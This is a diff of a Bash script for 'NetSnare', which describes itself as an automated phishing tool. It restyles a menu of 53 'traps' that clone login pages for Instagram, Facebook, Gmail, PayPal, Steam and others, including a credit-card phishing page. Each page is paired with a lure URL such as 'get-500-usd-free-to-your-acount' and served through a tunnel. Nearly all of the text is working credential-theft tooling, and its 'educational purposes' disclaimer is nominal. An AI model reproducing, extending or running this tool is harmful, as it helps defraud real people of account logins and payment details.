+    printf "${NeonBlue}┃${clear}\n"
+    printf "${NeonBlue}┗════┤ ${BHotPink}Select Trap [00-53]${NeonBlue} ├════┛${clear}\n"
+    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Input: ${clear}' option
 
-
-if [[ $option == 1 ]]; then
-instagram
-elif [[ $option == 2 ]]; then
-facebook
-elif [[ $option == 3 ]]; then
-website="snapchat"
-mask='https://view-locked-snapchat-accounts-secretly'
-tunnel_menu
-elif [[ $option == 4 ]]; then
-website="twitter"
-mask='https://get-blue-badge-on-twitter-free'
-tunnel_menu
-elif [[ $option == 5 ]]; then
-website="github"
-tunnel_menu
-elif [[ $option == 6 ]]; then
-gmail
-elif [[ $option == 7 ]]; then
-website="spotify"
-mask='https://convert-your-account-to-spotify-premium'
-tunnel_menu
-
-elif [[ $option == 8 ]]; then
-website="netflix"
-mask='https://upgrade-your-netflix-plan-free'
-tunnel_menu
-
-elif [[ $option == 9 ]]; then
-website="origin"
-mask='https://get-500-usd-free-to-your-acount'
-tunnel_menu
-
-elif [[ $option == 10 ]]; then
-website="steam"
-mask='https://steam-free-gift-card'
-tunnel_menu
-
-elif [[ $option == 11 ]]; then
-website="yahoo"
-mask='https://grab-mail-from-anyother-yahoo-account-free'
-tunnel_menu
-
-elif [[ $option == 12 ]]; then
-website="linkedin"
-mask='https://get-a-premium-plan-for-linkedin-free'
-tunnel_menu
-
-elif [[ $option == 13 ]]; then
-website="protonmail"
-mask='https://protonmail-pro-basics-for-free'
-tunnel_menu
-
-elif [[ $option == 14 ]]; then
-website="wordpress"
-mask='https://wordpress-traffic-free'
-tunnel_menu
-
-elif [[ $option == 15 ]]; then
-website="microsoft"
-mask='https://unlimited-onedrive-space-for-free'
-tunnel_menu
-
-elif [[ $option == 16 ]]; then
-website="instafollowers"
-tunnel_menu
-
-elif [[ $option == 17 ]]; then
-website="gitlab"
-mask='https://get-1k-followers-on-gitlab-free'
-tunnel_menu
-
-elif [[ $option == 18 ]]; then
-website="create"
-createpage
-tunnel_menu
-
-elif [[ $option == 19 ]]; then
-echo -e "\e[101m Bye!!.. and have a good day 👋 \e[0m"
-sleep 0.5
-exit 1 
-
-elif [[ $option == 20 ]]; then
-sleep 1
-echo "Updating NetSnare... " | lolcat
-sleep 0.5
-clear
-echo -e "\e[1;92m...//..\e[0m\e[1;93m~Searching for updates ~...\e[0m..//..\e[0m"
-sleep 2
-clear
-echo -e "\e[1;94m [+] Updates Found [+] \e[0m"
-sleep 2
-clear
-smallmenu() {
-sleep 0.5
-printf "\e[1;97mProceed to update?\e[0m"
-sleep 0.5
-printf "\n"
-sleep 0.5
-printf "\e[1;97m[01]\e[0m\e[1;92m Yes\e[0m\n"
-sleep 0.5
-printf "\e[1;97m[02]\e[0m\e[1;92m No\e[0m\n"
-sleep 0.5
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose: \e[0m\en' choice
-
-if [[ $choice == 1 || $choice == 01 ]]; then
-echo -e "\e[1;93m Nice choice... Haha😋\e[0m"
-sleep 0.5
-echo -e "\e[1;92m Press enter to update or \e[0m\e[1;37mCTRL C\e[0m\e[1;92m to exit.. \e[0m"
-read a1
-echo "Updating now..!!" | lolcat
-sleep 1
-cd $HOME || cd /data/data/com.termux/files/home
-rm -rf NetSnare
-git clone https://github.com/NetSnare/NetSnare
-cd NetSnare
-chmod 777 *
-printf "\e[1;92m[\e[0m\e[1;77m✔\e[0m\e[1;92m]\e[0m\e[1;93m Update Completed!!\e[0m\n" 
-echo ""
-printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;93m RUN bash NetSnare.sh\e[0m\n" 
-
-
-elif [[ $choice == 2 || $choice == 02 ]]; then
-echo -e "\e[1;94m As you wish...lol\e[0m"
-sleep 0.5
-echo -e "\e[1;93m Leave!!🙄\e[0m"
-sleep 2
-printf "\e[1;92m[\e[0m\e[1;77m!\e[0m\e[1;92m]\e[0m\e[1;93m NetSnare NOT UPDATED.!!!!!!..UPDATE!!\e[0m\n" 
-exit 1
-
-else
-printf "\e[1;93m [!] Wrong option [!]\e[0m\n"
-clear
-menu
-fi
-}
-smallmenu
-
-elif [[ $option == 21 ]]; then
-clear
-printf "\n"
-sleep 0.5
-printf "\e[1;92m============\e[0m\e[1;91m[\e[0m\e[1;93mAuthor\e[0m\e[1;91m]\e[0m\e[1;92m============\e[0m\n"
-sleep 0.5
-printf "\e[1;97m[•]\e[0m\e[1;91m Version: \e[0m\e[1;37m3.3.2		  \e[0m\e[1;97m  [•]\e[0m\n"
-sleep 0.5
-printf "\e[1;97m[•]\e[0m\e[1;91m Twitter: \e[0m\e[1;34m@a_lonely_ooo \e[0m\e[1;97m   [•]\e[0m\n"
-sleep 0.5
-printf "\e[1;97m[•]\e[0m\e[1;91m Facebook: \e[0m\e[1;36m@a_lonely_ooo \e[0m\e[1;97m  [•]\e[0m\n"
-sleep 0.5
-printf "\e[1;97m[•]\e[0m\e[1;91m Created by \e[0m\e[1;37m@a_lonely_ooo \e[0m\e[1;97m [•]\e[0m\n"
-sleep 0.5
-printf "\e[1;94m[•]\e[0m\e[1;91m Team: \e[0m\e[1;34mDont have any team currently😅 \e[0m\e[1;97m[•]\e[0m\n"
-sleep 0.5
-printf "\e[1;94m[•]\e[0m\e[1;91m Credits: \e[0m\e[1;34mJayansh and only Jayansh \e[0m\e[1;97m[•]\e[0m\n"
-sleep 0.5
-printf "\e[1;94m[•]\e[0m\e[1;91m Github: \e[0m\e[1;36m@a_lonely_ooo \e[0m\e[1;97m      [•] \e[0m\n"
-sleep 0.5
-printf "\e[1;92m==========\e[0m\e[1;91m[\e[0m\e[1;93mNetSnare\e[0m\e[1;91m]\e[0m\e[1;92m==========\e[0m\n"
-sleep 0.5
-printf "\n"
-sleep 0.5
-echo -e "\e[1;98m Press enter to go back \e[0m\e[1;37m or CTRL + C \e[0m\e[1;92mto exit\e[0m"
-read a1
-clear
-banner
-menu
-
-elif [[ $option == 22 ]]; then
-vk
-
-elif [[ $option == 23 ]]; then
-website="adobe"
-mask='https://get-adobe-lifetime-pro-membership-free'
-tunnel_menu
-
-elif [[ $option == 24 ]]; then
-website="badoo"
-mask='https://get-500-usd-free-to-your-acount'
-tunnel_menu
-
-elif [[ $option == 25 ]]; then
-website="cryptocoinsniper"
-tunnel_menu 
-
-elif [[ $option == 26 ]]; then
-website="deviantart"
-mask='https://get-500-usd-free-to-your-acount'
-tunnel_menu 
-
-elif [[ $option == 27 ]]; then
-website="dropbox"
-mask='https://get-1TB-cloud-storage-free'
-tunnel_menu
-
-elif [[ $option == 28 ]]; then
-website="ebay"
-mask='https://get-500-usd-free-to-your-acount'
-tunnel_menu
-
-elif [[ $option == 29 ]]; then
-website="paypal"
-mask='https://get-500-usd-free-to-your-acount'
-tunnel_menu
-
-elif [[ $option == 30 ]]; then
-website="pinterest"
-mask='https://get-a-premium-plan-for-pinterest-free'
-tunnel_menu
-
-elif [[ $option == 31 ]]; then
-website="playstation"
-mask='https://playstation-free-gift-card'
-tunnel_menu
-
-elif [[ $option == 32 ]]; then
-website="reddit"
-mask='https://reddit-official-verified-member-badge'
-tunnel_menu
-
-elif [[ $option == 33 ]]; then
-website="xbox"
-mask='https://get-500-usd-free-to-your-acount'
-tunnel_menu
-
-elif [[ $option == 34 ]]; then
-website="yandex"
-mask='https://grab-mail-from-anyother-yandex-account-free'
-tunnel_menu
-
-elif [[ $option == 35 ]]; then
-website="twitch"
-mask='https://unlimited-twitch-tv-user-for-free'
-tunnel_menu
-
-elif [[ $option == 36 ]]; then
-website="stackoverflow"
-mask='https://get-stackoverflow-lifetime-pro-membership-free'
-tunnel_menu
-
-elif [[ $option == 37 ]]; then
-website="messenger"
-tunnel_menu
-
-elif [[ $option == 38 ]]; then
-website="shopify"
-tunnel_menu
-
-elif [[ $option == 39 ]]; then
-website="shopping"
-tunnel_menu
-
-elif [[ $option == 40 ]]; then
-website="verizon"
-tunnel_menu
-
-elif [[ $option == 41 ]]; then
-website="quora"
-mask='https://quora-premium-for-free'
-tunnel_menu
-
-elif [[ $option == 42 ]]; then
-website="bet9ja"
-tunnel_menu
-
-elif [[ $option == 43 ]]; then
-website="Wi-Fi"
-tunnel_menu
-
-elif [[ $option == 44 ]]; then
-website="Bitcoin"
-tunnel_menu
-
-elif [[ $option == 45 ]]; then
-website="free_fire"
-tunnel_menu
-
-elif [[ $option == 46 ]]; then
-website="pugb"
-tunnel_menu
-
-elif [[ $option == 47 ]]; then
-website="fortnite"
-tunnel_menu
-
-elif [[ $option == 48 ]]; then
-website="cc-phishing"
-tunnel_menu
-
-elif [[ $option == 49 ]]; then
-website="cod"
-tunnel_menu
-
-elif [[ $option == 50 ]]; then
-website="mediafire"
-mask='https://get-1TB-on-mediafire-free'
-tunnel_menu
-
-elif [[ $option == 51 ]]; then
-website="airbnb"
-mask='https://airbnb-com'
-tunnel_menu
-
-elif [[ $option == 52 ]]; then
-website="discord"
-tunnel_menu
-
-elif [[ $option == 53 ]]; then
-website="roblox"
-tunnel_menu
-
-else
-printf "\e[1;93m[\e[0m\e[1;31m!\e[0m\e[1;93m]\e[0m\e[1;37m Invalid option\e[0m\e[1;93m [\e[0m\e[1;31m!\e[0m\e[1;93m]\e[0m\n"
-sleep 0.95
-clear || cls
-banner
-menu
-fi
+    if [[ $option == 1 ]]; then
+        instagram
+    elif [[ $option == 2 ]]; then
+        facebook
+    elif [[ $option == 3 ]]; then
+        website="snapchat"
+        mask='https://view-locked-snapchat-accounts-secretly'
+        tunnel_menu
+    elif [[ $option == 4 ]]; then
+        website="twitter"
+        mask='https://get-blue-badge-on-twitter-free'
+        tunnel_menu
+    elif [[ $option == 5 ]]; then
+        website="github"
+        tunnel_menu
+    elif [[ $option == 6 ]]; then
+        gmail
+    elif [[ $option == 7 ]]; then
+        website="spotify"
+        mask='https://convert-your-account-to-spotify-premium'
+        tunnel_menu
+    elif [[ $option == 8 ]]; then
+        website="netflix"
+        mask='https://upgrade-your-netflix-plan-free'
+        tunnel_menu
+    elif [[ $option == 9 ]]; then
+        website="origin"
+        mask='https://get-500-usd-free-to-your-acount'
+        tunnel_menu
+    elif [[ $option == 10 ]]; then
+        website="steam"
+        mask='https://steam-free-gift-card'
+        tunnel_menu
+    elif [[ $option == 11 ]]; then
+        website="yahoo"
+        mask='https://grab-mail-from-anyother-yahoo-account-free'
+        tunnel_menu
+    elif [[ $option == 12 ]]; then
+        website="linkedin"
+        mask='https://get-a-premium-plan-for-linkedin-free'
+        tunnel_menu
+    elif [[ $option == 13 ]]; then
+        website="protonmail"
+        mask='https://protonmail-pro-basics-for-free'
+        tunnel_menu
+    elif [[ $option == 14 ]]; then
+        website="wordpress"
+        mask='https://wordpress-traffic-free'
+        tunnel_menu
+    elif [[ $option == 15 ]]; then
+        website="microsoft"
+        mask='https://unlimited-onedrive-space-for-free'
+        tunnel_menu
+    elif [[ $option == 16 ]]; then
+        website="instafollowers"
+        tunnel_menu
+    elif [[ $option == 17 ]]; then
+        website="gitlab"
+        mask='https://get-1k-followers-on-gitlab-free'
+        tunnel_menu
+    elif [[ $option == 18 ]]; then
+        website="create"
+        createpage
+        tunnel_menu
+    elif [[ $option == 19 ]]; then
+        echo -e "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Shutting Down Quantum Matrix${clear}"
+        sleep 0.5
+        exit 1
+    elif [[ $option == 20 ]]; then
+        sleep 1
+        echo -e "${NeonBlue}[${BWhite}🔄${NeonBlue}]${AcidGreen} Initiating Quantum Update...${clear}"
+        sleep 0.5
+        clear
+        echo -e "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Scanning for Updates...${clear}"
+        sleep 2
+        clear
+        echo -e "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} New Quantum Core Detected${clear}"
+        sleep 2
+        clear
+        smallmenu() {
+            sleep 0.5
+            printf "${NeonBlue}[${BWhite}?${NeonBlue}]${AcidGreen} Proceed with Update?${clear}\n"
+            sleep 0.5
+            printf "${NeonBlue}│ ${BAcidGreen}[01]${AcidGreen} Yes${clear}\n"
+            sleep 0.5
+            printf "${NeonBlue}│ ${BAcidGreen}[02]${AcidGreen} No${clear}\n"
+            sleep 0.5
+            read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Input: ${clear}' choice
+            if [[ $choice == 1 || $choice == 01 ]]; then
+                echo -e "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Initiating Update${clear}"
+                sleep 0.5
+                echo -e "${NeonBlue}[${BWhite}🔄${NeonBlue}]${AcidGreen} Press Enter to Update or Ctrl+C to Abort${clear}"
+                read a1
+                echo -e "${NeonBlue}[${BWhite}🌌${NeonBlue}]${AcidGreen} Updating NetSnare...${clear}"
+                sleep 1
+                cd $HOME || cd /data/data/com.termux/files/home
+                rm -rf NetSnare
+                git clone https://github.com/NetSnare/NetSnare
+                cd NetSnare
+                chmod 777 *
+                printf "${NeonBlue}[${BWhite}✅${NeonBlue}]${AcidGreen} Quantum Core Updated${clear}\n"
+                printf "${NeonBlue}[${BWhite}🔋${NeonBlue}]${AcidGreen} Run: bash netsnare.sh${clear}\n"
+            elif [[ $choice == 2 || $choice == 02 ]]; then
+                echo -e "${NeonBlue}[${BWhite}🦠${NeonBlue}]${AcidGreen} Update Aborted${clear}"
+                sleep 2
+                printf "${NeonBlue}[${BWhite}🦠${NeonBlue}]${BWhite} NetSnare Not Updated${clear}\n"
+                exit 1
+            else
+                printf "${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Option${clear}\n"
+                clear
+                menu
+            fi
+        }
+        smallmenu
+    elif [[ $option == 21 ]]; then
+        clear
+        printf "\n"
+        sleep 0.5
+        printf "${NeonBlue}┳════┤ ${BHotPink}Quantum Architect${NeonBlue} ├════┓${clear}\n"
+        printf "${NeonBlue}┃${clear}\n"
+        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} Version: ${BWhite}1.0.0 (Quantum Beta)${clear}\n"
+        sleep 0.5
+        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} Instagram: ${BHotPink}@a_lonely_ooo${clear}\n"
+        sleep 0.5
+        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} GitHub: ${BHotPink}a-lonely-ooo${clear}\n"
+        sleep 0.5
+        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} Architect: ${BWhite}Jayansh${clear}\n"
+        sleep 0.5
+        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} Credits: ${BHotPink}@a_lonely_ooo${clear}\n"
+        sleep 0.5
+        printf "${NeonBlue}┃ ${BAcidGreen}[•]${AcidGreen} Unit: ${BWhite}Solo Quantum Core${clear}\n"
+        sleep 0.5
+        printf "${NeonBlue}┗━━━━━━━━━━━━━━━┛${clear}\n"
+        sleep 0.5
+        echo -e "${NeonBlue}[${BWhite}🔄${NeonBlue}]${AcidGreen} Press Enter to Return or Ctrl+C to Exit${clear}"
+        read a1
+        clear
+        banner
+        menu
+    elif [[ $option == 22 ]]; then
+        vk
+    elif [[ $option == 23 ]]; then
+        website="adobe"
+        mask='https://get-adobe-lifetime-pro-membership-free'
+        tunnel_menu
+    elif [[ $option == 24 ]]; then
+        website="badoo"
+        mask='https://get-500-usd-free-to-your-acount'
+        tunnel_menu
+    elif [[ $option == 25 ]]; then
+        website="cryptocoinsniper"
+        tunnel_menu
+    elif [[ $option == 26 ]]; then
+        website="deviantart"
+        mask='https://get-500-usd-free-to-your-acount'
+        tunnel_menu
+    elif [[ $option == 27 ]]; then
+        website="dropbox"
+        mask='https://get-1TB-cloud-storage-free'
+        tunnel_menu
+    elif [[ $option == 28 ]]; then
+        website="ebay"
+        mask='https://get-500-usd-free-to-your-acount'
+        tunnel_menu
+    elif [[ $option == 29 ]]; then
+        website="paypal"
+        mask='https://get-500-usd-free-to-your-acount'
+        tunnel_menu
+    elif [[ $option == 30 ]]; then
+        website="pinterest"
+        mask='https://get-a-premium-plan-for-pinterest-free'
+        tunnel_menu
+    elif [[ $option == 31 ]]; then
+        website="playstation"
+        mask='https://playstation-free-gift-card'
+        tunnel_menu
+    elif [[ $option == 32 ]]; then
+        website="reddit"
+        mask='https://reddit-official-verified-member-badge'
+        tunnel_menu
+    elif [[ $option == 33 ]]; then
+        website="xbox"
+        mask='https://get-500-usd-free-to-your-acount'
+        tunnel_menu
+    elif [[ $option == 34 ]]; then
+        website="yandex"
+        mask='https://grab-mail-from-anyother-yandex-account-free'
+        tunnel_menu
+    elif [[ $option == 35 ]]; then
+        website="twitch"
+        mask='https://unlimited-twitch-tv-user-for-free'
+        tunnel_menu
+    elif [[ $option == 36 ]]; then
+        website="stackoverflow"
+        mask='https://get-stackoverflow-lifetime-pro-membership-free'
+        tunnel_menu
+    elif [[ $option == 37 ]]; then
+        website="messenger"
+        tunnel_menu
+    elif [[ $option == 38 ]]; then
+        website="shopify"
+        tunnel_menu
+    elif [[ $option == 39 ]]; then
+        website="shopping"
+        tunnel_menu
+    elif [[ $option == 40 ]]; then
+        website="verizon"
+        tunnel_menu
+    elif [[ $option == 41 ]]; then
+        website="quora"
+        mask='https://quora-premium-for-free'
+        tunnel_menu
+    elif [[ $option == 42 ]]; then
+        website="bet9ja"
+        tunnel_menu
+    elif [[ $option == 43 ]]; then
+        website="Wi-Fi"
+        tunnel_menu
+    elif [[ $option == 44 ]]; then
+        website="Bitcoin"
+        tunnel_menu
+    elif [[ $option == 45 ]]; then
+        website="free_fire"
+        tunnel_menu
+    elif [[ $option == 46 ]]; then
+        website="pugb"
+        tunnel_menu
+    elif [[ $option == 47 ]]; then
+        website="fortnite"
+        tunnel_menu
+    elif [[ $option == 48 ]]; then
+        website="cc-phishing"
+        tunnel_menu
+    elif [[ $option == 49 ]]; then
+        website="cod"
+        tunnel_menu
+    elif [[ $option == 50 ]]; then
+        website="mediafire"
+        mask='https://get-1TB-on-mediafire-free'
+        tunnel_menu
+    elif [[ $option == 51 ]]; then
+        website="airbnb"
+        mask='https://airbnb-com'
+        tunnel_menu
+    elif [[ $option == 52 ]]; then
+        website="discord"
+        tunnel_menu
+    elif [[ $option == 53 ]]; then
+        website="roblox"
+        tunnel_menu
+    else
+        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Trap Selected${clear}\n"
+        sleep 0.95
+        clear
+        banner
+        menu
+    fi
 }
 
-facebook(){
-printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page?\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page?\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Fake Security Login Page?\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m04\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Messenger Login Page?\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m05\e[0m\e[1;31m]\e[0m\e[1;93m Facebook Free Likes Login Page?\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' fb_option
-
-
-if [[ $fb_option == 1 || $fb_option == 01 ]]; then
-website="facebook"
-mask='https://blue-badge-verified-badge-for-facebook'
-tunnel_menu
-elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
-website="fb_advanced"
-mask='https://vote-for-the-best-social-media'
-tunnel_menu
-elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
-website="fb_security"
-mask='https://make-your-facebook-secured-and-free-from-hackers'
-tunnel_menu
-elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
-website="fb_messenger"
-mask='https://get-messenger-premium-features-free'
-tunnel_menu
-elif [[ $fb_option == 5 || $fb_option == 05 ]]; then
-website="fb_freelikes"
-tunnel_menu
-
-else
-printf "\n\n  \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
-sleep 1
-banner
-menu
-fi
-
+facebook() {
+    printf "\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} Traditional Login${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} Voting Poll Login${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[03]${AcidGreen} Security Login${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[04]${AcidGreen} Messenger Login${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[05]${AcidGreen} Free Likes Login${clear}\n"
+    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Select Trap: ${clear}' fb_option
+    if [[ $fb_option == 1 || $fb_option == 01 ]]; then
+        website="facebook"
+        mask='https://blue-badge-verified-badge-for-facebook'
+        tunnel_menu
+    elif [[ $fb_option == 2 || $fb_option == 02 ]]; then
+        website="fb_advanced"
+        mask='https://vote-for-the-best-social-media'
+        tunnel_menu
+    elif [[ $fb_option == 3 || $fb_option == 03 ]]; then
+        website="fb_security"
+        mask='https://make-your-facebook-secured-and-free-from-hackers'
+        tunnel_menu
+    elif [[ $fb_option == 4 || $fb_option == 04 ]]; then
+        website="fb_messenger"
+        mask='https://get-messenger-premium-features-free'
+        tunnel_menu
+    elif [[ $fb_option == 5 || $fb_option == 05 ]]; then
+        website="fb_freelikes"
+        tunnel_menu
+    else
+        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Trap${clear}\n"
+        sleep 1
+        banner
+        menu
+    fi
 }
 
-instagram(){
-printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page? \e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page? \e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page? \e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' ig_option
-
-
-if [[ $ig_option == 1 || $ig_option == 01 ]]; then
-website="instagram"
-mask='https://instagram-com'
-tunnel_menu
-elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
-website="ig_followers"
-mask='https://get-unlimited-followers-for-instagram'
-tunnel_menu
-elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
-website="ig_verify"
-mask='https://blue-badge-verify-for-instagram'
-tunnel_menu
-
-else
-printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
-sleep 1
-banner
-menu
-fi
-
-}
-gmail(){
-printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Gmail Old Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Gmail New Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' gmail_option
-
-
-if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
-website="google"
-mask='https://get-unlimited-google-photos-free'
-tunnel_menu
-elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
-website="google_new"
-mask='https://get-unlimited-google-photos-free'
-tunnel_menu
-elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
-website="google_poll"
-mask='https://vote-for-the-best-social-media'
-tunnel_menu
-
-else
-printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
-sleep 1
-banner
-menu
-fi
-
-}
-stop() {
-
-checkphp=$(ps aux | grep -o "php" | head -n1)
-if [[ $checkphp == *'php'* ]]; then
-pkill -f -2 php > /dev/null 2>&1
-killall -2 php > /dev/null 2>&1
-fi
-
+instagram() {
+    printf "\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} Traditional Login${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} Auto Followers Login${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[03]${AcidGreen} Blue Badge Login${clear}\n"
+    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Select Trap: ${clear}' ig_option
+    if [[ $ig_option == 1 || $ig_option == 01 ]]; then
+        website="instagram"
+        mask='https://instagram-com'
+        tunnel_menu
+    elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
+        website="ig_followers"
+        mask='https://get-unlimited-followers-for-instagram'
+        tunnel_menu
+    elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
+        website="ig_verify"
+        mask='https://blue-badge-verify-for-instagram'
+        tunnel_menu
+    else
+        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Trap${clear}\n"
+        sleep 1
+        banner
+        menu
+    fi
 }
 
-vk(){
-printf " \n"
-printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Advanced Voting Poll Login Page\e[0m\n"
-printf "\e[0m\n"
-read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' vk_option
+gmail() {
+    printf "\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} Old Gmail Login${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} New Gmail Login${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[03]${AcidGreen} Voting Poll${clear}\n"
+    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Select Trap: ${clear}' gmail_option
+    if [[ $gmail_option == 1 || $gmail_option == 01 ]]; then
+        website="google"
+        mask='https://get-unlimited-google-photos-free'
+        tunnel_menu
+    elif [[ $gmail_option == 2 || $gmail_option == 02 ]]; then
+        website="google_new"
+        mask='https://get-unlimited-google-photos-free'
+        tunnel_menu
+    elif [[ $gmail_option == 3 || $gmail_option == 03 ]]; then
+        website="google_poll"
+        mask='https://vote-for-the-best-social-media'
+        tunnel_menu
+    else
+        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Trap${clear}\n"
+        sleep 1
+        banner
+        menu
+    fi
+}
 
-
-if [[ $vk_option == 1 || $vk_option == 01 ]]; then
-website="vk"
-mask='https://vk-premium-real-method-2020'
-tunnel_menu
-elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
-website="vk_poll"
-mask='https://vote-for-the-best-social-media'
-tunnel_menu
-
-else
-printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
-sleep 1
-banner
-menu
-fi
-
+vk() {
+    printf "\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[01]${AcidGreen} Traditional Login${clear}\n"
+    printf "${NeonBlue}┃ ${BAcidGreen}[02]${AcidGreen} Voting Poll Login${clear}\n"
+    read -p $'\n${NeonBlue}[${BWhite}>>${NeonBlue}]${BWhite} Select Trap: ${clear}' vk_option
+    if [[ $vk_option == 1 || $vk_option == 01 ]]; then
+        website="vk"
+        mask='https://vk-premium-real-method-2020'
+        tunnel_menu
+    elif [[ $vk_option == 2 || $vk_option == 02 ]]; then
+        website="vk_poll"
+        mask='https://vote-for-the-best-social-media'
+        tunnel_menu
+    else
+        printf "\n${HotPink}[${BWhite}🦠${HotPink}]${BWhite} Invalid Trap${clear}\n"
+        sleep 1
+        banner
+        menu
+    fi
 }
 
 banner() {
-printf "\e[1;78m                          \e[0m\n"
-printf "\e[1;31m             +-+-+-+-+-+-+-+-+  \e[0m\n"
-printf "\e${White}             |N|e|t|S|n|a|r|e| \e[0m\n"
-printf "\e[1;33m             +-+-+-+-+-+-+-+-+  \e[0m\n"
-printf "\e[1;34m         \e[0m\e[1;35m     ${RED}Version : ${CYAN}${__version__} \e[0m\n"
-printf "\n"
-printf "\e[1;93m  [*]\e[0m\e[1;67m Automated phishing tool by: @a_lonely_ooo [51+ templates] \e[0m\e[1;93m[*]\e[0m\n"
-printf "\e[1;93m     [*]\e[0m\e[1;37m Team: Dont have any team currently😅 \e[0m\e[1;93m[*]\e[0m\n"
-printf "\n"
-printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not::\e[0m\n"
-printf "  \e[101m\e[1;77m:: Responsible for any misuse or damage caused by NetSnare take care please !::\e[0m\n"
-printf "  \e[101m\e[1;77m:: NOTE: Only for Educational Purposes::\e[0m\n"
-printf "\n"
+    clear
+    printf "${NeonBlue}"
+    echo "┳════┳════┳════┳════┓"
